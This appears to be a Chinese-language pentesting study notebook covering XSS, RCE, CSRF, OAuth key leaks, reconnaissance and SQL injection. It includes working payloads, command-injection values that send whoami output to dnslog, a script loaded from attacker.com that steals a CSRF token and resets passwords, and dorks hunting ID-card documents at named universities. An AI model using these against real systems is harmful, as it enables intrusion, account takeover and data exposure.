a&quot;onfocus=alert(1) autofocus//</span><br><span class="line">            autofocus自动聚焦 打开alert</span><br><span class="line">        10.//setTimeout(&quot;alert(1)&quot;, 3000)		等待3秒后执行alert(1)</span><br><span class="line">            &lt;script&gt;setTimeout(&quot;console.log(\&#x27;&quot;+name+&quot;\&#x27;)&quot;, 100)&lt;/script&gt;</span><br><span class="line">            &#x27;)-alert(1)// </span><br><span class="line">            console.log(&#x27;&#x27;)-alert(1)//&#x27;)</span><br><span class="line">			eval(&quot;console.log(\&#x27;&quot;+name+&quot;\&#x27;)&quot;)</span><br><span class="line">		11.双引号里面的东西支持很多编码</span><br><span class="line">			&lt;a href=&quot;javascript&amp;#x3a;alert%281)&quot;&gt;a&lt;/a&gt;</span><br><span class="line">            </span><br><span class="line">    htmlentities($str, ENT_QUOTES)</span><br><span class="line">    	ENT_QUOTES转换单双引号</span><br><span class="line">    	ENT_COMPAT只转换单双引号</span><br><span class="line">    	ENT_NOQUOTES不转换任何引号</span><br><span class="line">    </span><br><span class="line">    svg</span><br><span class="line">		www.cnblogs.com/r00tgrok/p/SVG_Build_XSS_Vector_Bypass_Firefox_And_Chrome.html</span><br><span class="line">	</span><br><span class="line">	chrome同源设置的狠</span><br><span class="line">	怎么挖</span><br><span class="line">        1.先寻找没有转义的地方</span><br><span class="line">        2.找到操作未转义参数的包</span><br><span class="line">        3.插入payload</span><br><span class="line">        4.bypass 触发xss</span><br><span class="line"></span><br><span class="line">	反射xss过一下后端映射到前端，domxss不过后端</span><br><span class="line">	在线客服</span><br></pre></td></tr></table></figure>

<h3 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h3><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">上传点filename存在rce可能</span><br><span class="line">json中</span><br><span class="line">	&quot;filename&quot;:&quot;111.wave|ping `whoami`.xxx.dnslog.cn&quot;</span><br><span class="line">或者post传参中</span><br><span class="line">api接口中</span><br><span class="line">	GET /testapi/ping/192.168.5.1|`whoami`.xxx.dnslog.cn</span><br><span class="line">	GET /testapi/try_hear/123.wav|`whoami`.xxx.dnslog.cn</span><br></pre></td></tr></table></figure>

<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pdf组件</span><br><span class="line">	很多平台都存在将网页导出为pdf文件进行下载功能。而pdf转换工具很容易产生漏洞</span><br><span class="line">	1.pdf一般是后端组件 有的开发可能配置错误 使用file协议进行利用</span><br><span class="line">	2.pdf组件由于自身的代码问题或者调用内置的浏览器存在问题导致漏洞</span><br><span class="line">	&lt;iframe&gt;标签 导出为pdf处 抓包或者断点</span><br><span class="line">		大黄蜂pdf到处导致ssrf 2分30案例没看懂</span><br></pre></td></tr></table></figure>

<h3 id="cors-csrf"><a href="#cors-csrf" class="headerlink" title="cors csrf"></a>cors csrf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">	cross-origin resource sharing跨域资源共享</span><br><span class="line">		对于给定域之外的资源进行受控访问</span><br><span class="line">	SOP same-origin policy 同源政策</span><br><span class="line">	</span><br><span class="line">	在返回获取session值 获取api-key的地方测试</span><br><span class="line">	请求包加入Origin:</span><br><span class="line">		原url--&gt;一定能成</span><br><span class="line">		别的网页</span><br><span class="line">		自己的域名前面是原url</span><br><span class="line">		原url的子域名存在xss</span><br><span class="line">		null</span><br><span class="line">	返回有两个</span><br><span class="line">		Access-Control-Allow-Origin:....</span><br><span class="line">		Access-Control-Allow-Credentials:True</span><br><span class="line"></span><br><span class="line">	csrf:让受害者在不知情情况下发出请求</span><br><span class="line">	burp制作poc</span><br><span class="line">		burp抓包-&gt;Engagement tools-&gt;Generate CSRF PoC</span><br><span class="line">	看到参数 删掉或者置空试试 删掉改传参方式</span><br><span class="line">	注销 账号接管这种危害可以领钱</span><br><span class="line">	利用面广 自己可以操作的地方就可以利用</span><br><span class="line">	csrf xss组合拳提高危害</span><br><span class="line">	csrf思路在于基础功底 如第三方登录整体逻辑 扫码登录逻辑 注销逻辑</span><br><span class="line">	案例</span><br><span class="line">		1.app和网页注销共享cookie? 只验证一方</span><br><span class="line">		2.抓包修改密码用的 PATCH</span><br><span class="line">		PATCH PUT DELETE无法利用csrf</span><br><span class="line">		但是可以POST _method=PATCH</span><br><span class="line">		PATCH传参可以用_method=PATCH</span><br><span class="line">	OAuth原理</span><br><span class="line">		https://blog.csdn.net/weixin_44763552/article/details/123741791</span><br><span class="line">	拦截微信授权那个包发送授权code那个包? csrf发给别人 别人访问了 相当于我接管了别人的账号</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// xss+csrf组合拳	都在服务方的域名上</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;csrf-token&quot;</span> <span class="attr">content</span>=<span class="string">&#x27;....&#x27;</span>&gt;</span></span><br><span class="line">document.getElementsByTagName(&#x27;meta&#x27;)[&#x27;csrf-token&#x27;].content</span><br><span class="line"></span><br><span class="line">//js代码	%27--&gt;&gt;&#x27;   会把a写进html代码	这部分是xss插入的dom型</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">...</span> <span class="attr">href</span>=<span class="string">javaccript:eval(%27var</span> <span class="attr">a</span>=<span class="string">document.createElement(\%27script\%27));a.src</span>=<span class="string">\%27https://attacker.com/1.js;document.body.appendChild(a)%27)</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">//用户打开网址会访问到插入的xss 访问恶意脚本1.js</span><br><span class="line"></span><br><span class="line">//以下为1.js的内容</span><br><span class="line">var token=document.getElementsByTagName(&#x27;meta&#x27;)[&#x27;csrf-token&#x27;].content</span><br><span class="line">var httpRequest1 = new XMLHttpRequest()</span><br><span class="line">httpRequest1.open(&#x27;POST&#x27;, &#x27;https://test.com/reset&#x27;,true);</span><br><span class="line">httpRequest1.setRequest(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);//设置请求头</span><br><span class="line">httpRequest1.send(&quot;password=123456&amp;csrf_token&quot;+token)</span><br><span class="line">//用户自己发包修改了密码  该攻击手法不用考虑网站同源的问题</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">burp生成 修改json传参csrf 修改处如下 name处 enctype处</span><br><span class="line">	不能url编码 后端可能不解</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;....&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;a&quot;:&quot;dd&quot;,&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;&quot;:1&#125;&#x27;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="oauth2-0-api安全"><a href="#oauth2-0-api安全" class="headerlink" title="oauth2.0 api安全"></a>oauth2.0 api安全</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">app反编译完</span><br><span class="line">	查找关键字 appid appkey appsecret secret oss bos access_key ak sk或者看规则写正则 云链接	(火线社区)</span><br><span class="line"></span><br><span class="line">返回包临时密钥一般登不上 aliyun的例外</span><br><span class="line"></span><br><span class="line">某个利用需自己复现</span><br><span class="line">腾讯云-&gt;临时密钥-&gt;临时密钥上传手册-&gt;上传脚本留下来-&gt;上传脚本覆盖站内资源----&gt;&gt;&gt;&gt;高危</span><br><span class="line"></span><br><span class="line">百度aksk脚本</span><br><span class="line">	某个第一期师傅写的</span><br><span class="line">	gui_baiduBOSzmozmo</span><br><span class="line">*/</span><br><span class="line">OAuth	一种授权机制</span><br><span class="line">    1.客户向授权服务器AS获取令牌</span><br><span class="line">    2.客户使用令牌向资源服务器获取api接口</span><br><span class="line">    3.客户使用api向资源拥有者</span><br><span class="line">appkey		api标号</span><br><span class="line">appsecret   api密钥</span><br><span class="line">redirecturl	回调地址</span><br><span class="line"></span><br><span class="line">查找ak/sk的方式</span><br><span class="line">	1.js代码泄露ak/sk</span><br><span class="line">		ctrl+shift+f	浏览器js api接口全文件查找</span><br><span class="line">	2.github仓库泄露ak/sk</span><br><span class="line">	3.app反编译</span><br><span class="line">		jadx-gui</span><br><span class="line">		批量 apk自动化化反编译脚本</span><br><span class="line">			目标放进target文件夹 执行auto.py</span><br><span class="line">	4.小程序反编译</span><br><span class="line">		pc 微信 wechatfile/applet</span><br><span class="line">			先用UnpackMiniApp解密-&gt;.wxapkg文件		--&gt;这个解密软件有蠕虫病毒Synaptics.exe</span><br><span class="line">		再用CrackApp对.wxapkg文件逆编译</span><br><span class="line">	5.返回包中回显ak/sk</span><br><span class="line">		HaE		burp插件正则匹配网页中的配置信息</span><br><span class="line">	6.其余配置文件中</span><br><span class="line">		spring框架重要文件heapdump利用 存在未授权尝试获取这个文件</span><br><span class="line">		https://blog.csdn.net/cdyunaq/article/details/123821962</span><br><span class="line">		https://github.com/wyzxxz/heapdump_tool</span><br><span class="line">	7.web.archive.org 2021年11月之前的网站很有用</span><br><span class="line"></span><br><span class="line">有回调地址--&gt;&gt;oauth2.0</span><br><span class="line">redirect_url进行csrf攻击 重定向到百度 被攻击者的百度需要登录状态</span><br><span class="line"></span><br><span class="line">开发者平台api	阅读各个开发者平台   阅读越多挖的越多</span><br><span class="line">	各个开发者平台如何获取code access_token secret</span><br><span class="line">	1.微信	developers.weixin.qq.com			腾讯akid</span><br><span class="line">	2.华为</span><br><span class="line">	3.百度	ai.baidu.com</span><br><span class="line">	4.阿里</span><br><span class="line">	5.京东</span><br><span class="line">	6.微博	open.weibo.com/wiki/%E5%BE%AE%E5%8D%9AAPI</span><br><span class="line"></span><br><span class="line">小程序的反编译获取到apikey secretkey如何利用</span><br><span class="line">	寻找哪个开发者平台</span><br><span class="line">		百度</span><br><span class="line">	看开发者平台提供的功能</span><br></pre></td></tr></table></figure>

<h1 id="Blame"><a href="#Blame" class="headerlink" title="Blame"></a>Blame</h1><h3 id="1-web安全之网站架构分析"><a href="#1-web安全之网站架构分析" class="headerlink" title="1.web安全之网站架构分析"></a>1.web安全之网站架构分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">遇到过哪些架构的网站</span><br><span class="line">thinkphp spring shiro springboot structs django flask dedecms</span><br><span class="line"></span><br><span class="line">模板输出</span><br><span class="line">	请求一个后端接口 后端返回一个渲染好的html代码</span><br><span class="line">	以静态资源的地址来访问 相对路径 绝对路径</span><br><span class="line">	php文件干了html的事儿		sqllab</span><br><span class="line">	sql注入可能性大 源码编写 并非框架全局拦截 导致有些不是很统一</span><br><span class="line">	目录扫描 目录固定 文件命名可猜解</span><br><span class="line">	</span><br><span class="line">前后端分离	---mysql主从复制</span><br><span class="line">	mvc / soa / 微服务</span><br><span class="line">	后端只需要通过接口发送json数据 前端根据这些数据来显示</span><br><span class="line">	1.前端页面是个独立站点</span><br><span class="line">	2.调用的往往是aa.test.com 页面站点			调用站点aa.test.com:8080/api/</span><br><span class="line">	url地址带# 静态页面	静态路径的分割和标识符</span><br><span class="line">	日后端</span><br><span class="line">	view-source:		出来是一行</span><br><span class="line">	利用方式</span><br><span class="line">		1.jsfinder	找接口  找未授权</span><br><span class="line">		2.找后台服务		看接口的调用地址</span><br><span class="line">		3.找后台地址</span><br><span class="line"></span><br><span class="line">js编译型</span><br><span class="line">	新技术的出现 node.js vue angular react</span><br><span class="line">	1.有些过程是抓不到包的 注入基本很少 原因：有些数据直接在内存里面调用了 sync.exec(&#x27;+1&#x27;)</span><br><span class="line">	2.node.js 存在问题 越权访问 各种地址目录猜解 原因：js文件都是能看见的</span><br><span class="line">	3.接口未授权 进程注入</span><br><span class="line">	</span><br><span class="line">js -&gt;typescript -&gt; node.js</span><br><span class="line">typescript支持解析js node来执行</span><br><span class="line">node.js是一个解释器 服务器</span><br><span class="line">typescript写的代码给node.js去解析编译 给浏览器执行</span><br></pre></td></tr></table></figure>

<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">多换搜索引擎</span><br><span class="line">    google search：</span><br><span class="line">    身份证</span><br><span class="line">        &quot;上海大学&quot; site:shu.edu.cn intext:&quot;身份证&quot; filetype:pdf|txt|ppt|pptx|xlsx|csv|tsv|xls</span><br><span class="line">    找资产</span><br><span class="line">        site:shu.edu.cn intext:&quot;登录&quot;|&quot;忘记密码&quot;|&quot;后台&quot;|&quot;管理&quot;|&quot;教务&quot;|&quot;教育平台&quot;|&quot;...&quot;</span><br><span class="line">github</span><br><span class="line">	shu.edu.cn password vpn</span><br><span class="line"></span><br><span class="line">fofa</span><br><span class="line">公众号 小程序</span><br><span class="line"></span><br><span class="line">edusrc 开发商排行榜 src.sjtu.edu.cn</span><br></pre></td></tr></table></figure>

<h3 id="3-证书站外围资产"><a href="#3-证书站外围资产" class="headerlink" title="3.证书站外围资产"></a>3.证书站外围资产</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">交大 电子科技大学 同济 上理 常熟 广工 上外 南开 东林 长春 上音</span><br><span class="line">//没有vpn的思路</span><br><span class="line">外围网站收集</span><br><span class="line">1.注册点</span><br><span class="line">2.边缘登录</span><br><span class="line">3.老破小</span><br><span class="line">4.小程序</span><br><span class="line">5.公众号</span><br><span class="line">6.院校类内部的小众系统</span><br><span class="line">//举例</span><br><span class="line">google</span><br><span class="line">			tongji.edu.cn &quot;登录&quot;</span><br><span class="line">			同济大学 &quot;后台管理&quot; &quot;登录&quot;		//找边缘资产</span><br><span class="line">			同济大学 &quot;系统&quot; &quot;登录&quot;</span><br><span class="line">			同济大学 &quot;管理系统&quot; &quot;登录&quot;</span><br><span class="line">	航天 设计 艺术 软件 学生系统//注册 后台 验证码 管理 找回密码</span><br><span class="line">fofa</span><br><span class="line">			&quot;同济大学&quot;&quot;登录&quot;</span><br><span class="line">钟馗之眼</span><br><span class="line">			同济大学 登录</span><br><span class="line">bing</span><br><span class="line">			同济大学 登录</span><br><span class="line">不同搜索引擎的关键字输入获得的信息是不一样的</span><br><span class="line"></span><br><span class="line">瞄准小程序 + 公众号</span><br><span class="line">小程序搜同济大学 一个个看</span><br><span class="line">公众号上面去找 抓包容易一些</span><br><span class="line">pc端和小程序端的接口 一般是分开来写的 也有一部分是公共调用的</span><br><span class="line">接口之间的异同 pc端和小程序的功能有可能是两套系统</span><br><span class="line">域名后面加个admin main home</span><br><span class="line"></span><br><span class="line">//钓鱼 社工 搞密码 搞账号的思路很多</span><br></pre></td></tr></table></figure>

<h3 id="4-edu站点思路尝试"><a href="#4-edu站点思路尝试" class="headerlink" title="4.edu站点思路尝试"></a>4.edu站点思路尝试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">https://zone.huoxian.cn/d/226</span><br><span class="line">接口尝试的参数尝试使用fuzz进行爆破</span><br><span class="line">空白页可能是api服务端 盲猜接口或者fuzz</span><br><span class="line">每天留半小时看看文章 觉得不错试试总结一下</span><br><span class="line"></span><br><span class="line">外网</span><br><span class="line">登录注册 忘记密码(越权 注入情况很少 未授权从js中查看) 爆破很少 信息泄露</span><br><span class="line"></span><br><span class="line">进了内部</span><br><span class="line">1.找我的账号信息在哪 我的roleid 名字</span><br><span class="line">我的信息是通过接口返回的 页面直接写上去的</span><br><span class="line">	看看是否能越权</span><br><span class="line">	慢慢理解每个接口都干了什么事儿 要积累</span><br><span class="line">/api/menu/init</span><br><span class="line">/api/menu/userInfo		json数据包 html页面</span><br><span class="line"></span><br><span class="line">理解接口的含义 摒弃业务中的固定数据</span><br><span class="line">利用这个系统的权限规则</span><br><span class="line"></span><br><span class="line">文件上传</span><br><span class="line">从js找upload相关词的接口</span><br><span class="line">找业务上传点</span><br><span class="line">判断是否黑白名单</span><br><span class="line"></span><br><span class="line">内部系统可能存在不同于外部js的文件 接口其他的东西</span><br><span class="line"></span><br><span class="line">RCE版本框架漏洞 cms这种类型 搜百度</span><br><span class="line">构造报错 看能不能出线版本等其他信息</span><br><span class="line"></span><br><span class="line">xxe</span><br><span class="line">content-type:application/xml	或者数据包中返回了xml类型 此时可以去尝试构造</span><br></pre></td></tr></table></figure>

<h3 id="5-SQL注入"><a href="#5-SQL注入" class="headerlink" title="5.SQL注入"></a>5.SQL注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">登录 表单 url参数 cookie header 搜索 注册</span><br><span class="line">任何输入与数据库交互的地方都可能存在sql注入</span><br><span class="line">常用的一些检测语句</span><br><span class="line">&#x27; or &#x27;1&#x27; = &#x27;1	用or注意数据库的逻辑</span><br><span class="line">&#x27; and 1=1#</span><br><span class="line">&#x27;and(select+sleep(0))a+union+select+1)=&#x27;</span><br><span class="line">&#x27;||1=1#			&#x27;||1=2#		(注意页面和数据包的变化) </span><br><span class="line">|1/(if(1=1,1,exp(710)))			判断mysql？？</span><br><span class="line"></span><br><span class="line">2022%&#x27;)|1/if(1=1,1,exp(710))|(&#x27;%</span><br><span class="line">keyword=2020&#x27;)|floor() version| %23</span><br><span class="line">exp(709)+exp(710)	根据这个返回可以判断是mysql</span><br><span class="line">exp(210)+exp(209)	oracle</span><br><span class="line">exp() e的幂次</span><br><span class="line">盲注exp(709)不报错 exp(710)报错</span><br><span class="line">1.有回显直接出线sql语句	报错注入 updatexml(1, concat(&#x27;~&#x27;,(select+database())),1)%23</span><br><span class="line">2.无回显sleep(2) exp(210)	--&gt;dnslog(理解 true flase)</span><br><span class="line">3.搜索框当中的注入方式 --&gt; select * from admin where name like &quot;%&quot;.$name.&quot;%&quot;</span><br><span class="line">猜闭合规则才是重点</span><br><span class="line"></span><br><span class="line">up哥猜注入	查看返回包content-length</span><br><span class="line">keyword=2022%&#x27;)--+		</span><br><span class="line">2022&#x27;&#x27;|</span><br><span class="line">2022&#x27;</span><br><span class="line"></span><br><span class="line">函数替换</span><br><span class="line">and &amp;&amp;</span><br><span class="line">or	||</span><br><span class="line">ascii()   hex()</span><br><span class="line">substr()	mid()</span><br><span class="line">substr()		substr/**/()</span><br><span class="line"></span><br><span class="line">SeleCt 1;</span><br><span class="line"></span><br><span class="line">select * from dvwa.users where id=&#x27;1&#x27;||(substr(user(),1,1))like(&#x27;r%&#x27;)</span><br><span class="line"></span><br><span class="line">WAF检查参数</span><br><span class="line">js css很少检查</span><br><span class="line"></span><br><span class="line">参数污染核心</span><br><span class="line">a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1		消耗waf内存 每次waf都要检查</span><br><span class="line"></span><br><span class="line">content-type:application/x-www-form-urlencoded</span><br><span class="line">改成content-type:application/form-data</span><br><span class="line">修改post提交数据</span><br><span class="line"></span><br><span class="line">waf要讲效率 构造打的类型的报文</span><br><span class="line">比如content-type改成上传图片</span><br><span class="line">然后上传个大图</span><br><span class="line"></span><br><span class="line">分析接口存在的含义 以及与数据库交互的可能性</span><br><span class="line">数据包的各个参数都不要放过</span><br><span class="line">Webservice接口(还可能造成严重的未授权)</span><br><span class="line">排序可控除 js文件的一些未授权接口 spring未授权接口</span><br><span class="line">深度测试，切勿浮躁</span><br></pre></td></tr></table></figure>

<h3 id="6-SQL注入总结"><a href="#6-SQL注入总结" class="headerlink" title="6.SQL注入总结"></a>6.SQL注入总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.sql语句中的函数优先执行			*****</span><br><span class="line">2.执行完成的结果 拼接sql语句</span><br><span class="line">3.sql语句告诉mysql 开始执行查询</span><br><span class="line"></span><br><span class="line">显注	报错 联合</span><br><span class="line">盲注	时间 布尔</span><br><span class="line"></span><br><span class="line">select * from aa where id = 1 and updatexml(&#x27;~&#x27;, concat((select database()), 1))</span><br><span class="line"></span><br><span class="line">select * FROM dvwa.users where user_id = 1 and updatexml(1,concat(&#x27;~&#x27;,(select version()),&#x27;~&#x27;),1);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br><span class="line">改变XML_document中符合XPATH_string的</span><br><span class="line"></span><br><span class="line">盲注 substr if ascii</span><br><span class="line">or sleep()	执行时间取决于数据表大小</span><br></pre></td></tr></table></figure>

